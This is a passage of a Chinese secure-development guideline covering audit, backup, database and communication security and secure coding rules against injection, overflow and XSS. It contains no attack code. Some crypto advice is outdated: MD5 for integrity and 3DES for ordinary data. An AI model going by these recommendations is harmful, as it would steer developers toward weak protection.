type="checkbox"> 需传送的数据的保密性和完整性要求；</li><li style="list-style: none"><input type="checkbox"> 对传送数据的合法性检验规则；</li><li style="list-style: none"><input type="checkbox"> 对通信可靠性的要求；</li><li style="list-style: none"><input type="checkbox"> 与外部系统的互相认证方面的需求；</li><li style="list-style: none"><input type="checkbox"> 信息传输过程的加密需求。</li></ul><h4 id="2-2-2-数据安全功能"><a href="#2-2-2-数据安全功能" class="headerlink" title="2.2.2 数据安全功能"></a>2.2.2 数据安全功能</h4><ul><li>1、 应用系统的数据安全功能，应当根据安全需求进行功能设计，内容涉及：数据库的安全、数据采集、数据传输、数据处理、数据存储、数据备份和恢复的安全。对重要的敏感数据应进行加密和完整性保护。</li><li>2、 应用软件应包含输入的安全性设计，主要指对错误输入、恶意输入进行处理。</li><li>3、 应用软件应包含输出的安全性设计。</li></ul><h4 id="2-2-3-安全审计功能"><a href="#2-2-3-安全审计功能" class="headerlink" title="2.2.3 安全审计功能"></a>2.2.3 安全审计功能</h4><ul><li>1、 应用系统具备如下安全审计功能：</li><li style="list-style: none"><input type="checkbox"> 审计功能的启动和关闭；</li><li style="list-style: none"><input type="checkbox"> 变更审计功能的配置信息；</li><li style="list-style: none"><input type="checkbox"> 至少应进行审计的事件：进入和退出的时间(登录、退出系统)、异常的系统使用行为(失败登录)、系统维护行为、敏感行为和其它安全功能要求的审计内容；</li><li style="list-style: none"><input type="checkbox"> 每个审计记录中至少记录如下信息：事件的日期和时间、事件的类型、主题标识、事件的结果(成功、失败)和事件相关信息。</li><li>2、 应用系统应支持数据查阅审计功能：按照主题、事件查阅；应用系统应明确用户能够查阅审计数据用户。</li><li>3、 在意外情况出现时，应有措施保证审计数据的可用性，当审计记录溢出时采取保护行动。</li></ul><h4 id="2-2-4-容错功能设计"><a href="#2-2-4-容错功能设计" class="headerlink" title="2.2.4 容错功能设计"></a>2.2.4 容错功能设计</h4><ul><li>1、 应用软件应包含各模块的出错处理设计。</li><li>2、 应用软件应包含可能出现的各种异常情况的安全处理设计，如：错误信息不回显给用户。</li><li>3、 应用软件应包含抗网络攻击的能力的设计及系统脆弱性分析。</li><li>4、 对于应用软件本身的资源及服务的优先保障设计。</li></ul><h3 id="2-3-应用系统存储安全设计要求"><a href="#2-3-应用系统存储安全设计要求" class="headerlink" title="2.3 应用系统存储安全设计要求"></a>2.3 应用系统存储安全设计要求</h3><p>在应用系统存储安全设计时，应对系统的存储容量、存储介质、存储备份内容、存储备份方式、存储设备功能要求及相关的存储技术统筹进行考虑。</p><h4 id="2-3-1-应用系统的存储容量设计"><a href="#2-3-1-应用系统的存储容量设计" class="headerlink" title="2.3.1 应用系统的存储容量设计"></a>2.3.1 应用系统的存储容量设计</h4><p>应依据对于应用数据的测算，估算应用系统的存储容量，建议在存储容量估算时应考虑以下要求：</p><ul><li style="list-style: none"><input type="checkbox"> 在实际估算值上预留30%的存储余量，并考虑未来的应用存储量的增长需求。</li><li style="list-style: none"><input type="checkbox"> 考虑到应用系统自身的审计数据的容量、保存期限以配置相应的存储设备。</li><li style="list-style: none"><input type="checkbox"> 对于应用系统中的临时数据和过渡数据，应当设计其保存的时间，并以此考虑这部分的存储容量要求。</li></ul><h4 id="2-3-2-应用系统的存储介质选择"><a href="#2-3-2-应用系统的存储介质选择" class="headerlink" title="2.3.2 应用系统的存储介质选择"></a>2.3.2 应用系统的存储介质选择</h4><p>应用系统的存储介质主要包括但不限于：磁带、光盘、磁盘、磁盘阵列和云存储。具体存储介质的选择应依据应用系统的业务种类及存储周期的要求，采用不同的介质。</p><ul><li>1、 对于应用系统的交易数据，应采用高性能、高可靠的存储介质，如磁盘、磁盘阵列、云存储等进行存储；</li><li>2、 对于应用系统的历史数据，应采用可靠、稳定的存储介质，如磁带、光盘等进行存储。</li></ul><h4 id="2-3-3-应用系统存储备份对象"><a href="#2-3-3-应用系统存储备份对象" class="headerlink" title="2.3.3 应用系统存储备份对象"></a>2.3.3 应用系统存储备份对象</h4><p>应用系统对于其储存备份的对象设计，应包括如下内容：</p><ul><li>1、 系统数据的备份：应包括Web服务器的网站内容、Mail服务器的邮件实时备份、数据库、文件服务器中的文件以及其他数据；</li><li>2、 系统的完全备份：应包括关键的、需要快速恢复的设备，通过磁带机的完全备份，应实现快速的灾难恢复；</li><li>3、 系统的冗余主机备份：对于关键并且不能停止的服务设备（如计费服务、Web、Mail服务器），应考虑使用多台主机进行冗余备份，以保证当任何一台主机发生故障时，服务器仍可提供服务；</li><li>4、 系统配置的备份：应包括关键路由器的配置、防火墙的配置、各类服务器操作系统的安全配置以及各类服务器（如Web、Mail、文件服务器等）中间件和容器（如Apache、tomcat、nginx、weblogic等）的配置。</li></ul><h4 id="2-3-4-应用系统存储备份方式"><a href="#2-3-4-应用系统存储备份方式" class="headerlink" title="2.3.4 应用系统存储备份方式"></a>2.3.4 应用系统存储备份方式</h4><p>应用系统应当根据不同的阶段，系统数据不同的重要程度，对数据采取不同的备份方式：</p><ul><li>1、 完全备份<br>使用备份介质对整个系统进行完全备份，包括系统和数据。这种备份方式的优点是直观，容易被人理解，而且当数据丢失时，可以快速恢复丢失的数据。它也有不足之处：</li><li style="list-style: none"><input type="checkbox"> 定期对系统进行完全备份，因此在备份数据中有大量的重复信息，占用了大量的存贮空间，增加了备份成本；</li><li style="list-style: none"><input type="checkbox"> 需要备份的数据量大，因此备份所需要的时间较长。</li><li style="list-style: none"><input type="checkbox"> 建议在关键性应用系统的实施前、实施后、变更以及升级等重要操作时，对操作系统进行完全备份。针对信息较小的不断变化的，且变化的内容大于50％的，定期进行完全备份。</li><li>2、 增量备份<br>每次备份的数据只是相当于上一次备份后增加和修改过的数据。没有重复的备份数据，节省备份介质的空间，缩短了备份时间。这种备份的优点很明显，同时也存在某些不足之处，即当发生灾难时，恢复数据比较麻烦。<br>建议在关键性应用系统正常运行维护阶段，针对变化的、不断增加的信息，定期进行增量备份。</li><li>3、 差异备份<br>每次备份的数据只是相当于上一次完全备份后新增加和修改过的数据，即采用完全备份和差异备份相结合备份策略。如：每周日进行一次完全备份，而周一至周六进行差异备份。其优点为：没有重复的备份数据，即节省备份介质的空间，缩短了备份时间；缺点为：当发生灾难时，恢复数据比较麻烦。<br>建议应用系统的正常运行维护阶段，针对不断变化的（变化的内容小于<br>50％）系统，定期进行差异备份。</li><li>4、 按需备份<br>按需备份是指在正常的备份安排之外，额外进行的备份操作，这种备份方式可以弥补冗余管理以及长期转存的日常备份的不足。因此它是一种非常灵活、重要的备份方式，在应用系统的各个阶段，如果备份的内容较少，可以采用按需备份。<br>建议应用系统在下列情况下采取按需备份：</li><li style="list-style: none"><input type="checkbox"> 只需要备份很少的几个文件、目录、数据库或数据库中的表；</li><li style="list-style: none"><input type="checkbox"> 备份服务器上必要的配置文件。</li><li>5、 排除备份<br>排除备份是指排除不需要的文件后再进行备份。从本质上讲，排除备份不是一种备份方法，只是减少备份冗余的一种方法。<br>建议应用系统在下列情况下考虑排除备份：</li><li style="list-style: none"><input type="checkbox"> 有些文件非常大，但并不重要；</li><li style="list-style: none"><input type="checkbox"> 某些文件总是导致备份异常或出错。</li><li>6、 备份恢复测试<br>不管是全备、增备、差异、按需还是排除备份，都应该定期对已被分的数据进行恢复测试，保证备份数据的可用性，在关键时刻可以及时并快速的恢复系统。</li></ul><h4 id="2-3-5-应用系统的存储设备功能要求"><a href="#2-3-5-应用系统的存储设备功能要求" class="headerlink" title="2.3.5 应用系统的存储设备功能要求"></a>2.3.5 应用系统的存储设备功能要求</h4><p>应用系统存储设备的功能要求应包括如下内容：</p><ul><li>1、 存储设备应保证数据的高可用性和完整性要求；</li><li>2、 存储设备应具有在多主机环境下工作的能力；</li><li>3、 存储设备应能方便地做到快速备份和恢复，重要系统应做到双机备份、支持热插拔；</li><li>4、 存储设备应有简便的、功能强大的管理工具，做到对整个存储系统的监视与控制。</li></ul><h3 id="2-4-应用系统通讯安全设计要求"><a href="#2-4-应用系统通讯安全设计要求" class="headerlink" title="2.4 应用系统通讯安全设计要求"></a>2.4 应用系统通讯安全设计要求</h3><ul><li>1、 应采用安全通信协议对重要数据进行安全传输（尤其是账号、口令信息），如使用SSL/TLS、HTTPS、SFTP和IPSec、SCP等安全协议进行通信：终端与服务器端之间的WWW服务，建议使用HTTPS安全通信协议；终端与服务器端之间的FTP服务，建议使SFTP安全通信协议；终端与服务器端之间的Telnet服务，建议使SSH安全通信协议。</li><li>2、 终端应用程序采用加密传输机制对重要信息进行传输。</li><li>3、 终端应用程序采用完整性检查对业务的重要数据或敏感数据进行检查。</li><li>4、 终端应用程序应采用抗抵赖攻击技术对重要的交互信息进行保护。</li><li>5、 终端应用程序使用固定的通信端口。</li><li>6、 对于需要映射到公网的端口，不要使用原端口，在条件允许的情况下使用白名单访问。</li></ul><h3 id="2-5-应用系统数据库安全设计要求"><a href="#2-5-应用系统数据库安全设计要求" class="headerlink" title="2.5 应用系统数据库安全设计要求"></a>2.5 应用系统数据库安全设计要求</h3><ul><li>1、 应从以下方面进行数据库的选型：</li><li style="list-style: none"><input type="checkbox"> 数据库、应用系统的运行环境；</li><li style="list-style: none"><input type="checkbox"> 数据库的稳定性、安全性（多级安全）；</li><li style="list-style: none"><input type="checkbox"> 数据库的容量（最多支持的库的数目、表的数目、记录数目）；</li><li style="list-style: none"><input type="checkbox"> 数据库的存取速度；</li><li style="list-style: none"><input type="checkbox"> 是否支持多种备份方式；</li><li style="list-style: none"><input type="checkbox"> 是否支持数据库的导入和导出。</li><li>2、 应明确数据库相关的用户管理、资源管理、特权管理和角色管理，明确各种用户的资源权限，并建立规范的权限文档。</li><li>3、 数据库原则上应及时更新重要补丁。在安装补丁前应先在测试环境进行，提前进行数据备份，充分准备回退方案和应急预案。</li><li>4、 数据库的配置应符合相应的基线配置要求。</li><li>5、 应及时修改数据库的默认密码或将默认账号锁定、删除。</li><li>6、 数据库的账号应根据业务和维护需要进行合理分配，避免账号共用。</li><li>7、 数据库每个用户之间的权限需要隔离。</li><li>8、 需要对数据库操作进行审计，包含：账号、操作、时间等指标。</li></ul><h3 id="2-6-应用系统数据安全设计要求"><a href="#2-6-应用系统数据安全设计要求" class="headerlink" title="2.6 应用系统数据安全设计要求"></a>2.6 应用系统数据安全设计要求</h3><h4 id="2-6-1-数据采集安全"><a href="#2-6-1-数据采集安全" class="headerlink" title="2.6.1 数据采集安全"></a>2.6.1 数据采集安全</h4><p>应根据数据采集的内容、采集的频率、数据精确度要求、时间特性等来进行数据采集的安全要求设计，数据采集服务器和采集主机应考虑30%的系统开销及冗余。</p><h4 id="2-6-2-数据传输安全"><a href="#2-6-2-数据传输安全" class="headerlink" title="2.6.2 数据传输安全"></a>2.6.2 数据传输安全</h4><ul><li>1、 应按照数据的类型、数据的重要程度、网络的安全状况等综合因素，对<br>数据的传输采取不同的安全保护，包括但不限于防火墙、IDS、IPSEC-VPN、病毒防护等安全措施。</li><li>2、 应了解数据传输存在安全隐患的网络或设备，对存在安全隐患的网络采取必要的安全技术，包括但不限于安全通信协议、加密算法、完整性检查算法以及抗抵赖攻击方法等。</li><li>3、 应制定数据传输安全的检查方式，包括但不限于数据传输安全抗主动攻击能力检查、被动抗攻击的能力检查。</li><li>4、 应保障“数据传输安全”有关的重要配置参数安全，包括但不限于口令、加/解密算法、加/解密密钥等。</li><li>5、 应采用安全通信协议对数据进行安全传输，如使用SSL/TLS、HTTPS、SFTP和IPSec等安全协议进行通信。</li><li>6、 对传输的信息进行不同等级的加密保护，即根据网络或设备的风险、传输内容安全要求的不同，选择不同安全强度的加密算法对信息进行加密传输。建议使用RSA等高强度的密码算法对非常重要的信息（如口令、加密密钥）进行加密传输；对于普通数据的传输，可以采用RSA、3DES等相对安全的加密算法进行加密传输。</li><li>7、 应防止对所传输数据进行未经授权的任何形式的修改，即对业务的重要数据或敏感数据，建议使用MD5、SHA等算法对数据完整性进行保护。</li><li>8、 对重要的交互信息，建议采取抗抵赖技术，包括但不限于数字签名技术。</li><li>9、 为了配合网络其它安全设备，建议采用基于用户名/口令的认证技术、VLAN技术、MPLS技术等安全技术手段。</li></ul><h4 id="2-6-3-数据处理安全"><a href="#2-6-3-数据处理安全" class="headerlink" title="2.6.3 数据处理安全"></a>2.6.3 数据处理安全</h4><ul><li>1、 应根据数据的类型、数据的处理方式、数据的安全性要求、与其它接口有关的敏感等级、数据相关业务应用的重要性程度来进行数据处理过程的安全性设计。</li><li>2、 应对原始数据进行检错和校验操作，保证原始数据的正确性和完整性。</li><li>3、 数据在转换过程中，应采用通用的标准格式，应考虑相关的不同系统和不同应用的格式需求。</li><li>4、 数据处理过程应提供处理数据的状态信息和数据处理过程的动态信息。</li><li>5、 数据处理过程应具备异常处理功能，在任一环节发现问题，均应能及时回退，必要时可以人工处理。</li><li>6、 数据处理的中间过程和中间结果不能暴露给第三方。</li></ul><h2 id="3、-应用系统开发安全"><a href="#3、-应用系统开发安全" class="headerlink" title="3、 应用系统开发安全"></a>3、 应用系统开发安全</h2><h3 id="3-1-安全原则"><a href="#3-1-安全原则" class="headerlink" title="3.1 安全原则"></a>3.1 安全原则</h3><ul><li>1、 保护最薄弱的环节原则：保护最易受攻击影响的部分；</li><li>2、 纵深防御原则：不同层面、不同角度之间需要相互配合；</li><li>3、 最小权限原则：只授予执行操作所需的最小权限；</li><li>4、 最小共享原则：使共享文件资源尽可能少；</li><li>5、 权限分离原则：授予不同用户所需的最小权限，并在它们之间形成相互制约的关系；</li></ul><h3 id="3-2-需求管理阶段"><a href="#3-2-需求管理阶段" class="headerlink" title="3.2 需求管理阶段"></a>3.2 需求管理阶段</h3><ul><li>1、 根据业务目标分析并制定系统安全目标；</li><li>2、 确认安全需求规格说明。</li></ul><h3 id="3-3-系统设计阶段"><a href="#3-3-系统设计阶段" class="headerlink" title="3.3 系统设计阶段"></a>3.3 系统设计阶段</h3><ul><li>1、 根据安全目标执行威胁建模，识别威胁和风险；</li><li>2、 根据威胁建模制定对应开发安全任务：</li><li style="list-style: none"><input type="checkbox"> 确定安全体系架构，设计安全协议和安全接口；</li><li style="list-style: none"><input type="checkbox"> 确定访问控制与身份鉴别机制，定义主体角色和权限；</li><li style="list-style: none"><input type="checkbox"> 信息输入的安全过滤，信息输出的校验和控制；</li><li style="list-style: none"><input type="checkbox"> 数据结构安全设计，选择加密方法和算法；</li><li style="list-style: none"><input type="checkbox"> 确定敏感数据保护方法；</li><li style="list-style: none"><input type="checkbox"> 内部处理逻辑安全设计；</li><li style="list-style: none"><input type="checkbox"> 评估内部通信机制，确定完整性机制。</li></ul><h3 id="3-4-系统实现阶段"><a href="#3-4-系统实现阶段" class="headerlink" title="3.4 系统实现阶段"></a>3.4 系统实现阶段</h3><ul><li>1、 开发环境安全管理要求：</li><li style="list-style: none"><input type="checkbox"> 软件系统开发、测试禁止在生产环境中进行；</li><li style="list-style: none"><input type="checkbox"> 开发环境中的开发用机应进行统一安全配置及时进行系统补丁升级和漏洞修复；</li><li style="list-style: none"><input type="checkbox"> 软件程序不得篡改应用软件所运行的环境或平台中任何安全配置、安全文件和安全程序。</li><li>2、 编码安全要求（后面会有详细讲解）：</li><li style="list-style: none"><input type="checkbox"> 遵循代码编写安全规范，根据代码编写安全规范以及安全设计方案进行系统开发；</li><li style="list-style: none"><input type="checkbox"> 遵循通用安全编程准则，包括输入验证、缓存溢出、安全调用组件和程序编译等；</li><li style="list-style: none"><input type="checkbox"> 遵循机密性要求，保护用户访问信息的机密性，严禁在客户端存放敏感数据</li><li style="list-style: none"><input type="checkbox"> 避免内存溢出，严格检查和验证输入输出信息等；</li><li style="list-style: none"><input type="checkbox"> 遵循结构化异常处理机制，捕捉并处理程序异常，防止系统信息泄露；</li><li style="list-style: none"><input type="checkbox"> 遵循代码脆弱性防范要求，包括缓冲区溢出、SQL注入、跨站脚本攻击、XML注入攻击、HTTP HEAD注入等。</li><li>3、 开发流程安全要求：</li><li style="list-style: none"><input type="checkbox"> 开发过程中应对阶段性开发成果进行有效管理；</li><li style="list-style: none"><input type="checkbox"> 开发过程中应定期进行代码静态分析，使用代码审核工具对源代码进行检测，并报告源代码中存在的安全弱点；</li><li style="list-style: none"><input type="checkbox"> 开发人员不得超越其规定权限进行开发，不得在程序中设置后门或恶意代码程序。</li></ul><h3 id="3-5-系统测试阶段"><a href="#3-5-系统测试阶段" class="headerlink" title="3.5 系统测试阶段"></a>3.5 系统测试阶段</h3><ul><li>1、 测试内容应包括代码的安全测试和安全功能测试；</li><li>2、 代码的安全测试是指使用代码测试工具或渗透测试来识别代码的安全脆弱性，并应按照其提供的修复建议进行修复；</li><li>3、 安全功能测试主要包括身份认证和访问控制的功能测试；</li><li>4、 测试系统环境应尽可能模拟生产环境并与生产环境进行安全隔离；</li><li>5、 真实数据不得直接在测试环境中使用，须进行适当修改或屏蔽，在测试完成之后须立即从测试应用系统清除运行信息；</li><li>6、 测试人员编制安全测试方案，构造安全测试用例；</li><li>7、 验收测试不得由开发人员兼岗。</li></ul><h3 id="3-6-系统上线阶段"><a href="#3-6-系统上线阶段" class="headerlink" title="3.6 系统上线阶段"></a>3.6 系统上线阶段</h3><ul><li>1、 系统上线须在内部验收通过后进行；</li><li>2、 需进行上线前试运行，确认应用系统是否符合上线要求；</li><li>3、 上线成功后，记录上线的日期和内容。</li></ul><h3 id="3-7-文档管理"><a href="#3-7-文档管理" class="headerlink" title="3.7 文档管理"></a>3.7 文档管理</h3><ul><li>1、 源代码的变更和版本发布进行统一控制，对程序资源库的任何修改、更新和发布都需经部门主管领导授权和批准；</li><li>2、 应指定专人妥善保管程序源代码及相关技术文档。</li></ul><h3 id="3-8-外包管理"><a href="#3-8-外包管理" class="headerlink" title="3.8 外包管理"></a>3.8 外包管理</h3><ul><li>1、应与外包开发单位签署相关知识产权保护协议和保密协议；</li><li>2、外包开发单位进行系统开发过程中须严格遵循本制度的相关安全要求；</li><li>3、在系统开发过程中须指派专人监督审核外包开发单位在各个阶段安全要求的执行情况；</li><li>4、外包开发单位在系统开发完成后提供程序源代码和相关技术文档，不得将计算机系统采用的关键安全技术措施和核心安全功能设计对外公开；</li><li>5、应对开发完成后的应用软件进行审查或检测。</li></ul><h2 id="4、-应用系统编码安全"><a href="#4、-应用系统编码安全" class="headerlink" title="4、 应用系统编码安全"></a>4、 应用系统编码安全</h2><h3 id="4-1-基本代码安全要求"><a href="#4-1-基本代码安全要求" class="headerlink" title="4.1 基本代码安全要求"></a>4.1 基本代码安全要求</h3><h4 id="4-1-1-输入验证"><a href="#4-1-1-输入验证" class="headerlink" title="4.1.1 输入验证"></a>4.1.1 输入验证</h4><p>对函数入口参数的合法性和准确性进行检查，具体如下：</p><ul><li style="list-style: none"><input type="checkbox"> 在B/S环境下，应进行服务端的验证而不仅仅是客户端的验证（例如基于Javascript的验证）。通过在客户端和服务器之间放置一个代理服务器，可以很容易绕过客户端验证。有了代理服务器，攻击者可以在数据被客户端“验证”后修改数据（与“中间人”攻击类似）。</li><li style="list-style: none"><input type="checkbox"> 在实际的校验中，输入校验首先定义一个有效（可接受）的字符集，然后检查每个数据的字符是否在有效范围内。如果输入中包含无效的字符，应用程序应该返回错误页面并说明输入中包含无效字符。这样进行验证的原因是定义无效的字符集比较困难，并且一些不应该有效的字符通常不会被指出。</li><li style="list-style: none"><input type="checkbox"> 另外，边界检查（例如字符串的最大长度）应该在字符有效性检查以前进行，边界分析可以防止大多数缓冲区溢出漏洞。</li><li style="list-style: none"><input type="checkbox"> 从环境变量获得的数据也需要进行验证，同时避免在环境变量中存放敏感数据（例如密码）。</li></ul><h4 id="4-1-2-SQL语句"><a href="#4-1-2-SQL语句" class="headerlink" title="4.1.2 SQL语句"></a>4.1.2 SQL语句</h4><p>如果应用程序需要连接后端数据库，使用存储过程而不能在代码中使用SQL语句，使用程序以外的嵌入在代码中的SQL语句调用特别危险，难以防止攻击者使用输入域或者配置文件（由应用程序载入）来执行嵌入式的SQL攻击。当然，输入验证有助于缓解这种风险。</p><h4 id="4-1-3-注释代码"><a href="#4-1-3-注释代码" class="headerlink" title="4.1.3 注释代码"></a>4.1.3 注释代码</h4><p>当应用程序在实际环境中开始应用时，应该删除所有的注释代码。注释代码是用来调试或者测试的，它们不是最终应用程序的一部分。无论如何应该在实际的环境中删除它们以避免意外的执行（一般注释标识被删除后就无法激活休眠的代码，但还是存在可能性的，所以强烈建议执行这项工作）。</p><h4 id="4-1-4-错误消息"><a href="#4-1-4-错误消息" class="headerlink" title="4.1.4 错误消息"></a>4.1.4 错误消息</h4><p>所有为用户显示的错误信息都不应该暴露任何关于系统、网络或应用程序的敏感信息。如果可能，应使用包含编号的一般的错误信息，这种信息不返回给访问用户，只返回404错误，如“发生了错误（代码1234），请您与系统维护部门联系。</p><h4 id="4-1-5-URL内容"><a href="#4-1-5-URL内容" class="headerlink" title="4.1.5 URL内容"></a>4.1.5 URL内容</h4><p>对于Web应用，不能在URL上暴露任何重要信息，例如密码、服务器名称、IP地址或者文件系统路径（暴露了Web服务器的目录结构），这些信息可以在攻击时被使用。</p><h4 id="4-1-6-设置PATH变量"><a href="#4-1-6-设置PATH变量" class="headerlink" title="4.1.6 设置PATH变量"></a>4.1.6 设置PATH变量</h4><p>设置PATH为一个已知的值，而不是仅仅使用启动时的缺省值。攻击者可以在攻击应用程序时使用PATH变量，例如试图执行一个任意的程序，这些可以应用于大多数其他的语言。</p><h4 id="4-1-7-其他要求"><a href="#4-1-7-其他要求" class="headerlink" title="4.1.7 其他要求"></a>4.1.7 其他要求</h4><ul><li>1、 禁止使用未经授权和验证的代码。</li><li>2、 使用第三方代码，应对代码安全性进行评估和测试。</li><li>3、 测试用的“后门”，应在发布版中去除。</li><li>4、 规范代码的格式。</li><li>5、 规范变量、函数的命名；</li><li>6、 规范程序的书写格式，确保程序的易读性。</li><li>7、 对代码进行版本控制，确保代码的可用性。</li><li>8、 防止程序员非授权修改代码</li><li>9、 对代码的访问权限进行严格的权限控制；</li><li>10、 禁止在程序中添加隐藏“恶意”的代码，防止与应用系统相关的程序员对系统的非授权修改。</li><li>11、 应用系统不应在程序或进程中固化账号和口令。</li><li>12、 系统应具备对口令猜测的防范机制和监控手段。</li><li>13、 避免应用程序以错误的顺序运行，或者防止出现故障时，后续程序以不正常的流程运行。</li><li>14、采用正确的故障恢复程序，确保正确处理数据。</li><li>15、采取会话控制或批次控制，确保更新前后数据文件的一致性，例如：检查操作前后文件打开和关闭的数目是否一致。</li><li>16、检查执行操作前后对象的差额是否正常，如：句柄处理，堆栈等系统资源的占用与释放等。</li><li>17、严格验证系统生成的数据。</li><li>18、在网络传输过程中检查下载/上传的数据或软件的完整性。</li><li>19、检查文件与记录是否被篡改。例如通过计算哈希值（HASH）进行对比。</li><li>20、禁止私自讲代码上传到互联网。</li></ul><h3 id="4-2-Web编程安全基本要求"><a href="#4-2-Web编程安全基本要求" class="headerlink" title="4.2 Web编程安全基本要求"></a>4.2 Web编程安全基本要求</h3><h4 id="4-2-1-输入检查安全"><a href="#4-2-1-输入检查安全" class="headerlink" title="4.2.1 输入检查安全"></a>4.2.1 输入检查安全</h4><ul><li>1、 限制用户输入HTML和Script(JavaScript、VBScript)代码。输入恶意HTML或Script（JavaScript、VBScript）代码可能会对其他浏览者造成混淆、欺骗或恶意破坏的结果。</li><li>2、 检查用户输入数据的长度。输入超出限定长度的数据，可能造成服务器端程序溢出。</li><li>3、 防止用户输入特殊字符改变SQL语义。输入含特殊字符的字串，篡改SQL语句的语义，可能造成SQL查询执行不该执行的操作，以此绕</li><li>4、 过身份认证获取非法权限、甚至对数据进行破坏。</li><li>5、 限制用户能够访问的最顶层目录。编写对服务器端文件、目录操作的程序时应该注意限定此类程序能够访问的最顶层目录，防止用户构造输入字串借助程序功能访问服务器关键文件导致泄漏服务器敏感信息。</li><li>6、 对所有类型的用户输入都要做检查，并严格限定什么是合法的用户输入，限定一个合法输入的范围，同时过滤有可能造成危险的特殊字符。</li><li>7、 对不可信任域发送到可信任域的数据一定要进行检查。</li><li>8、 尽可能在服务器端完成用户输入检查，不能轻易相信客户端脚本的检查结果。虽然客户端的Script脚本能完成一部分的用户输入检查功能，但这种检查的结果是不可信任的，攻击者可以自己制作表单程序绕过客户端脚本验证，将非法数据提交到服务器。</li><li>9、 在输入变为输出时，也要对特殊字符做检查和转换。</li></ul><h4 id="4-2-2-敏感数据的存放和传递安全"><a href="#4-2-2-敏感数据的存放和传递安全" class="headerlink" title="4.2.2 敏感数据的存放和传递安全"></a>4.2.2 敏感数据的存放和传递安全</h4><ul><li>1、 敏感数据不能存放在Web页中。</li><li>2、 不能把敏感的数据存储在cookie、隐藏字段或者潜在地可能会被用户修改的地方。</li><li>3、 客户端向服务器端提交敏感数据应该经过加密（例如使用SSL），尽量不能明文传输。</li><li>4、 密码等敏感信息存放在数据库中应该加密，并采用健壮的加密算法。</li><li>5、 防止数据库被攻破后泄漏用户密码。</li><li>6、 敏感数据需要脱敏显示。</li></ul><h4 id="4-2-3-缓冲区溢出安全"><a href="#4-2-3-缓冲区溢出安全" class="headerlink" title="4.2.3 缓冲区溢出安全"></a>4.2.3 缓冲区溢出安全</h4><ul><li>1、 所有的输入都必须进行正确的有效性检测。</li><li>2、 必须保证数组没有越界，增加数组操作函数的边界检查。</li><li>3、 安全地使用字符串处理函数，慎用有安全隐患的字符串处理函数</li><li>4、 使用Format字符串的时候特别注意Unicode和ANSI的大小不一致的情况。</li><li>5、 注意字符串结束符的保护。</li><li>6、 仔细研究库函数内部的缓冲区分配，明确其限制。不能使用realpath()等函数，如果功能需要必须使用时，一定要检查试图规范化的路径的长度，确保其不长于MAXPATHLEN。</li><li>7、 时刻进行边界检查。建议使用一些检查工具：Purify、Stackguard等检查代码，保证没有缓冲区溢出的问题。</li></ul><h4 id="4-2-4-格式化字符串安全"><a href="#4-2-4-格式化字符串安全" class="headerlink" title="4.2.4 格式化字符串安全"></a>4.2.4 格式化字符串安全</h4><ul><li>1、 使用固定的格式化字符串，或者来自可信源的格式化字符串。</li><li>2、 要检查并限定locale的请求为合法值。</li><li>3、 不能将用户输入直接作为格式化字符传给格式化函数。</li></ul><h4 id="4-2-5-整数溢出安全"><a href="#4-2-5-整数溢出安全" class="headerlink" title="4.2.5 整数溢出安全"></a>4.2.5 整数溢出安全</h4><ul><li>1、 对于涉及到内存分配大小的计算，要进行仔细检查，确保计算不会产生溢出。</li><li>2、 对于涉及到数组索引的计算，要进行仔细检查，确保计算不会产生溢出。</li><li>3、 要使用无符号整数表示数组偏移和内存分配大小。</li></ul><h4 id="4-2-6-SQL注入代码安全"><a href="#4-2-6-SQL注入代码安全" class="headerlink" title="4.2.6 SQL注入代码安全"></a>4.2.6 SQL注入代码安全</h4><ul><li>1、 要检查输入的有效性和可信度。</li><li>2、 要使用参数化的查询、占位符、或者参数绑定来构造SQL语句。</li><li>3、 要在程序之外存储数据库的连接信息，比如经过保护的配置文件或者Windows注册表。</li><li>4、 即使使用的是存储过程，也不能使用字符串连接来构造SQL语句。</li><li>5、 不能在存储过程内部使用字符串连接来构造SQL语句。</li><li>6、 不能在存储过程内部执行不可信的参数。</li><li>7、 不能简单地双写单引号或者双引号。</li><li>8、 不能使用高权限账号连接数据库，比如sa或者root。</li><li>9、 不能在程序或者连接字符串中存储登录口令。</li><li>10、 不能在Web根目录下存储数据库配置信息。</li><li>11、 应从数据库中删除对所有用户自定义表的访问权限，同时只对存储过程授权，然后使用存储过程以及参数化的查询来构造查询字符串。</li></ul><h4 id="4-2-7-命令注入代码安全"><a href="#4-2-7-命令注入代码安全" class="headerlink" title="4.2.7 命令注入代码安全"></a>4.2.7 命令注入代码安全</h4><ul><li>1、 在输入命令传递给命令处理程序之前要进行验证。</li><li>2、 如果输入验证失败，要安全地处理失败信息。</li><li>3、 不能向任何命令解释器传递未验证的输入信息，即使这些输入仅仅是数据信息。</li><li>4、 避免使用正则表达式来进行输入验证，应手工去写一些简单而又清晰的验证代码。</li></ul><h4 id="4-2-8-异常处理代码安全"><a href="#4-2-8-异常处理代码安全" class="headerlink" title="4.2.8 异常处理代码安全"></a>4.2.8 异常处理代码安全</h4><ul><li>1、 要检测每个安全相关函数的返回值。</li><li>2、 对于每一个更改用户设定或者及其设定的函数，都要检查其返回值。</li><li>3、 要有从错误条件中进行恢复的考虑，避免拒绝服务攻击。</li><li>4、 不能一次性处理所有的异常，要将异常情况进行分类处理，避免在异常处理代码中的漏洞发生。</li></ul><h4 id="4-2-9-跨站脚本代码安全"><a href="#4-2-9-跨站脚本代码安全" class="headerlink" title="4.2.9 跨站脚本代码安全"></a>4.2.9 跨站脚本代码安全</h4><ul><li>1、 要对所有基于Web的输入进行输入验证和可信度验证。</li><li>2、 在没有验证合法性之前，不能对基于Web的输入进行回显。</li><li>3、 不能在cookie中存储敏感数据。</li></ul><h4 id="4-2-10-保护网络流量的代码安全"><a href="#4-2-10-保护网络流量的代码安全" class="headerlink" title="4.2.10 保护网络流量的代码安全"></a>4.2.10 保护网络流量的代码安全</h4><ul><li>1、 要使用强大的初始认证机制。</li><li>2、 对应用程序所产生的所有网络流量都要执行过程中消息认证。</li><li>3、 尽可能使用SSL/TLS进行网络加密传输。</li></ul><h4 id="4-2-11-应用中的弱口令代码安全"><a href="#4-2-11-应用中的弱口令代码安全" class="headerlink" title="4.2.11 .应用中的弱口令代码安全"></a>4.2.11 .应用中的弱口令代码安全</h4><ul><li>1、 确保口令在网络上认证时不被窃听。</li><li>2、 要在登录失败时给出错误提示，并记录失败口令尝试。</li><li>3、 尽可能使用基于hash强壮的单向加密函数进行口令存储。</li><li>4、 为用户更改口令提供安全的机制。</li><li>5、 不得使用默认账号和默认口令，若使用，必须在首次登录后进行修改。</li><li>6、 不得在程序、后台存储明文的口令。</li><li>7、 